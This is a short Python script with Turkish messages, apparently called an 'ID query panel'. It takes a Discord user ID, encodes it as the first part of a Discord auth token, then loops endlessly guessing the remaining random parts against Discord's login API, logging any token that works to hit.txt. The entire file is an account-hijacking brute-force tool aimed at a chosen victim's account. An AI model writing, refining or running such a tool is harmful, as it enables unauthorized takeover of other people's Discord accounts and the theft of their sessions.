import base64
import os
import random
import string
import requests
from colorama import *
alf = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-_"

id_to_token = base64.b64encode((input("ID Yİ YAZ :  ")).encode("ascii"))
banner = (Fore.MAGENTA + """ 

 -  CANO BABA ID SORGULAMA PANELI  - SADECE BİR KISMINI GÖSTERİR YAPIM AŞAMASINDADIR


""" + Fore.LIGHTCYAN_EX)
id_to_token = str(id_to_token)[2:-1]


while id_to_token == id_to_token:
    token = id_to_token + '.' + ('').join(random.choices(alf, k=6)) + '.' + ('').join(random.choices(alf, k=27))
    headers={
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] CALISAN TOKEN ' + ' ' + token)
            f = open('hit.txt', "a+")
            f.write(f'{token}\n')
        else:
            print(Fore.RED + '[-] CALISMAYAN TOKEN' + ' ' + token)
    finally:
        print("YAPIM AŞAMASINDADIR BİRAZ ÇALIŞIYOR")


input()
